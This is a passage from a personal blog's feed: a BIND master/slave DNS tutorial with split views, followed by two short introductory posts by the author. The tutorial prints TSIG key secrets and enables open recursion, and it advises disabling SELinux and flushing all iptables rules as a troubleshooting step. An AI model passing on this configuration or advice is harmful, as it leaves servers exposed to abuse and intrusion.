</span><span class='line'> <span class="mi">112</span>                             <span class="no">IN</span> <span class="no">PTR</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'> <span class="mi">112</span>                             <span class="no">IN</span> <span class="no">PTR</span> <span class="n">bbs</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'> <span class="mi">112</span>                             <span class="no">IN</span> <span class="no">PTR</span> <span class="n">wordpress</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'> <span class="mi">112</span>                            <span class="no">IN</span> <span class="no">PTR</span> <span class="n">ftp</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<h5>10.10.10.zone</h5>

<figure class='code'><figcaption><span>10.10.10.zone - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="vg">$TTL</span> <span class="mi">86400</span>
</span><span class='line'> <span class="err">@</span>       <span class="no">IN</span> <span class="no">SOA</span>  <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span> <span class="p">(</span>
</span><span class='line'>                                         <span class="mi">20130424</span>        <span class="p">;</span> <span class="n">serial</span>
</span><span class='line'>                                         <span class="mi">3</span><span class="n">H</span>      <span class="p">;</span> <span class="n">refresh</span>
</span><span class='line'>                                         <span class="mi">15</span><span class="n">M</span>     <span class="p">;</span> <span class="k">retry</span>
</span><span class='line'>                                         <span class="mi">1</span><span class="n">W</span>      <span class="p">;</span> <span class="n">expire</span>
</span><span class='line'>                                         <span class="mi">1</span><span class="n">D</span> <span class="p">)</span>    <span class="p">;</span> <span class="n">minimum</span>
</span><span class='line'> <span class="err">@</span>                                       <span class="no">IN</span> <span class="no">NS</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'>                                         <span class="no">IN</span> <span class="no">MX</span> <span class="mi">11</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'> <span class="mi">112</span>                             <span class="no">IN</span> <span class="no">PTR</span> <span class="n">taolr</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'> <span class="mi">112</span>                             <span class="no">IN</span> <span class="no">PTR</span> <span class="n">linbbs</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'> <span class="mi">112</span>                             <span class="no">IN</span> <span class="no">PTR</span> <span class="n">wordpress</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span><span class='line'> <span class="mi">112</span>                            <span class="no">IN</span> <span class="no">PTR</span> <span class="n">ftp</span><span class="o">.</span><span class="n">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<h4>slave named.conf</h4>

<figure class='code'><figcaption><span>(slave)192.168.10.111/named.conf - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="n">acl</span> <span class="n">zone1</span> <span class="p">{</span>
</span><span class='line'> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">78</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">acl</span> <span class="n">zone2</span> <span class="p">{</span>
</span><span class='line'> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">key</span> <span class="n">lan192</span> <span class="p">{</span>
</span><span class='line'>         <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'>         <span class="n">secret</span> <span class="s2">&quot;RQXeMPEXAj5Mx37pzJ044A==&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">key</span> <span class="n">lan10</span> <span class="p">{</span>
</span><span class='line'>         <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'>         <span class="n">secret</span> <span class="s2">&quot;TUklzhkwYd6roL7tO4BE5Q==&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">options</span>
</span><span class='line'> <span class="p">{</span>
</span><span class='line'>   <span class="n">listen</span><span class="o">-</span><span class="n">on</span> <span class="n">port</span> <span class="mi">53</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>   <span class="n">directory</span> <span class="s2">&quot;/var/named&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="n">dump</span><span class="o">-</span><span class="n">file</span> <span class="s2">&quot;/var/named/data/cache_dump.db&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="n">statistics</span><span class="o">-</span><span class="n">file</span> <span class="s2">&quot;/var/named/data/named_stats.txt&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="n">memstatistics</span><span class="o">-</span><span class="n">file</span> <span class="s2">&quot;/var/named/data/named_mem_stats.txt&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="n">query</span><span class="o">-</span><span class="n">source</span> <span class="n">port</span> <span class="mi">53</span><span class="p">;</span>
</span><span class='line'>   <span class="n">query</span><span class="o">-</span><span class="n">source</span><span class="o">-</span><span class="n">v6</span> <span class="n">port</span> <span class="mi">53</span><span class="p">;</span>
</span><span class='line'>   <span class="n">allow</span><span class="o">-</span><span class="n">query</span> <span class="p">{</span> <span class="n">any</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>   <span class="n">allow</span><span class="o">-</span><span class="n">recursion</span> <span class="p">{</span> <span class="n">any</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>   <span class="n">version</span> <span class="s2">&quot;None of your business&quot;</span><span class="p">;</span>
</span><span class='line'>   <span class="n">notify</span> <span class="n">yes</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">view</span> <span class="s2">&quot;lan192&quot;</span> <span class="p">{</span>
</span><span class='line'>         <span class="n">match</span><span class="o">-</span><span class="n">clients</span> <span class="p">{</span> <span class="n">key</span> <span class="n">lan192</span><span class="p">;</span><span class="n">zone1</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>         <span class="n">server</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span> <span class="p">{</span> <span class="n">keys</span><span class="p">{</span><span class="n">lan192</span><span class="p">;};</span> <span class="p">};</span>
</span><span class='line'>         <span class="n">zone</span> <span class="s2">&quot;test.cn&quot;</span> <span class="no">IN</span> <span class="p">{</span>
</span><span class='line'>                         <span class="n">type</span> <span class="n">slave</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">file</span> <span class="s2">&quot;slaves/test.cn.lan192&quot;</span><span class="p">;</span>          <span class="sr">//</span><span class="no">Notice</span> <span class="n">the</span> <span class="no">PATH</span><span class="o">.</span>
</span><span class='line'>                         <span class="n">masters</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                 <span class="p">};</span>
</span><span class='line'>         <span class="n">zone</span> <span class="s2">&quot;10.168.192.in-addr.arpa&quot;</span> <span class="no">IN</span> <span class="p">{</span>
</span><span class='line'>                         <span class="n">type</span> <span class="n">slave</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">file</span> <span class="s2">&quot;slaves/192.168.10.zone&quot;</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">masters</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                 <span class="p">};</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="n">view</span> <span class="s2">&quot;lan10&quot;</span> <span class="p">{</span>
</span><span class='line'>         <span class="n">match</span><span class="o">-</span><span class="n">clients</span> <span class="p">{</span> <span class="n">key</span> <span class="n">lan10</span><span class="p">;</span><span class="n">zone2</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>         <span class="n">server</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span> <span class="p">{</span> <span class="n">keys</span><span class="p">{</span><span class="n">lan10</span><span class="p">;};</span> <span class="p">};</span>
</span><span class='line'>         <span class="n">zone</span> <span class="s2">&quot;test.cn&quot;</span> <span class="no">IN</span> <span class="p">{</span>
</span><span class='line'>                         <span class="n">type</span> <span class="n">slave</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">file</span> <span class="s2">&quot;slaves/test.cn.lan10&quot;</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">masters</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                 <span class="p">};</span>
</span><span class='line'>         <span class="n">zone</span> <span class="s2">&quot;10.10.10.in-addr.arpa&quot;</span> <span class="no">IN</span> <span class="p">{</span>
</span><span class='line'>                         <span class="n">type</span> <span class="n">slave</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">file</span> <span class="s2">&quot;slaves/10.10.10.zone&quot;</span><span class="p">;</span>
</span><span class='line'>                         <span class="n">masters</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'>                 <span class="p">};</span>
</span><span class='line'> <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Finaly</h4>

<p>restart the primary nameserver and slave server.
Notice, if you do not familiar with the SElinux and Iptables.</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> setenforce 0
</span><span class='line'> iptables -F
</span></code></pre></td></tr></table></div></figure>


<p>Then look:</p>

<figure class='code'><figcaption><span>slaves/zonefiles - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@slave</span> <span class="n">slaves</span><span class="o">]</span><span class="c1"># pwd</span>
</span><span class='line'> <span class="sr">/var/n</span><span class="n">amed</span><span class="o">/</span><span class="n">chroot</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">slaves</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@slave</span> <span class="n">slaves</span><span class="o">]</span><span class="c1"># ls</span>
</span><span class='line'> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>  <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>  <span class="nb">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan10</span>  <span class="nb">test</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan192</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Check it with &#8220;nslookup&#8221;, &#8220;host&#8221; or &#8220;dig&#8221;.</h4>

<p>eg:</p>

<figure class='code'><figcaption><span>192.168.10.78/nslookup - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@client</span> <span class="sr">/]# nslookup</span>
</span><span class='line'><span class="sr">&gt; server 192.168.10.112</span>
</span><span class='line'><span class="sr">Default server: 192.168.10.112</span>
</span><span class='line'><span class="sr">Address: 192.168.10.112#53</span>
</span><span class='line'><span class="sr">&gt; set type=a</span>
</span><span class='line'><span class="sr">&gt; bbs.test.cn</span>
</span><span class='line'><span class="sr">Server:         192.168.10.112</span>
</span><span class='line'><span class="sr">Address:        192.168.10.112#53</span>
</span><span class='line'>
</span><span class='line'><span class="sr">Name:   bbs.test.cn</span>
</span><span class='line'><span class="sr">Address: 192.168.10.112</span>
</span><span class='line'><span class="sr">&gt; ftp.test.cn</span>
</span><span class='line'><span class="sr">Server:         192.168.10.112</span>
</span><span class='line'><span class="sr">Address:        192.168.10.112#53</span>
</span><span class='line'>
</span><span class='line'><span class="sr">ftp.test.cn      canonical name = bbs.test.cn.</span>
</span><span class='line'><span class="sr">Name:   bbs.test.cn</span>
</span><span class='line'><span class="sr">Address: 192.168.10.112</span>
</span><span class='line'><span class="sr">&gt; set type=ptr</span>
</span><span class='line'><span class="sr">&gt; 192.168.10.112</span>
</span><span class='line'><span class="sr">Server:         192.168.10.112</span>
</span><span class='line'><span class="sr">Address:        192.168.10.112#53</span>
</span><span class='line'>
</span><span class='line'><span class="sr">112.10.168.192.in-addr.arpa     name = ftp.test.cn.</span>
</span><span class='line'><span class="sr">112.10.168.192.in-addr.arpa     name = taolr.test.cn.</span>
</span><span class='line'><span class="sr">112.10.168.192.in-addr.arpa     name = linbbs.test.cn.</span>
</span><span class='line'><span class="sr">112.10.168.192.in-addr.arpa     name = wordpress.test.cn.</span>
</span><span class='line'><span class="sr">&gt; exit</span>
</span></code></pre></td></tr></table></div></figure>


<h3>&#8230;&#8230;</h3>

<h4>If you changed the primary zone files, and reload the file. The secondary nameserver will reload the zone files automatically!</h4>

<h4>Reference:</h4>

<p><a href="http://www.amazon.com/DNS-BIND-5th-Cricket-Liu/dp/0596100574">OReilly DNS and BIND, 5th Edition.</a><br />
Do you need it? It&#8217;s so nice. <strong><em>linuxtaolinran@gmail.com</em></strong> <br />
<a href="http://ftp.isc.org/isc/bind9/cur/9.9/doc/arm/Bv9ARM.pdf">BIND 9 Administrator Reference Manual</a></p>

<h4>more&#8230;&#8230;</h4>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[about my site]]></title>
    <link href="http://lin-credible.github.io/blog/2013/04/15/this-site/"/>
    <updated>2013-04-15T13:58:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/04/15/this-site</id>
    <content type="html"><![CDATA[<p><img src="http://lin-credible.github.io/images/bash.jpg" alt="alt text" /><br />
Firstly, thanks for <a href="http://kumu-linux.github.io/">Kumu-linux</a>! He is my good friend and he let me know something about this. Thanks so much.</p>

<p>Secondly, I just want to share something about technology with you, and I hope you can teach me. I&#8217;m a newbie.</p>

<p>Thirdly, I&#8217;m going to write my blog in English and go to great lengths to make you can understand me. My english is poor, so I want to make a change.</p>

<p>Now I&#8217;d like to say something others.</p>

<!-- more -->


<p>Majored in computer science and technology in medical university.</p>

<p><img src="http://lin-credible.github.io/images/my_university.jpg" alt="alt text" /><br /></p>

<p>I love computer. But I know I&#8217;m a newbie.</p>

<p>I don&#8217;t know how long I can use it freely, of course, hope permanently.</p>

<p><a href="http://coolshell.cn/">Coolshell</a> is so nice. There are so many great site and blog that set a good example of me. I have learned so much from there.</p>

<p>Doing something for the great <strong>Internet</strong> and <strong>open</strong> world is the goal of my life.</p>

<p>Maybe I&#8217;m young, 91&#8217;s, just live for my dream.  No money, but I have a dream.</p>

<p>I&#8217;m so happy about this site! Thanks for <strong>github</strong> and <strong>octopress</strong>.</p>

<p>I have to believe in myself when no one else does.</p>

<h3>Think and open heart.</h3>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[A newbie here]]></title>
    <link href="http://lin-credible.github.io/blog/2013/04/12/a-newbie-here/"/>
    <updated>2013-04-12T16:11:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/04/12/a-newbie-here</id>
    <content type="html"><![CDATA[<h2>Hello, I&#8217;m Taolinran, a newbie. I&#8217;m coming!</h2>

<p><img src="http://lin-credible.github.io/images/me.jpg" alt="alt text" /><br />
I&#8217;m a <strong>newbie</strong>! I love <strong>linux</strong> and there is my <a href="http://blog.csdn.net/c__ilikeyouma">csdn blog</a>!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ Hello "login:root"
</span><span class='line'>$ Hello "help contents;"
</span><span class='line'>$ Hello "#/bin/bash"
</span><span class='line'>$ Hello vim /etc/*.conf
</span><span class='line'>$ Hello ^&.+*#/%[{;@!$
</span><span class='line'>$ Hello \&lt;\s\w+*\&gt;
</span><span class='line'>$ Hello 8.8.8.8
</span><span class='line'>$ Hello :!r sample.conf
</span><span class='line'>$ Hello .
</span><span class='line'>$ Hello *</span></code></pre></td></tr></table></div></figure>


<h4>Love my girl, love my work</h4>

<h3>Right here, right now, action ^C</h3>
]]></content>
  </entry>
  
</feed>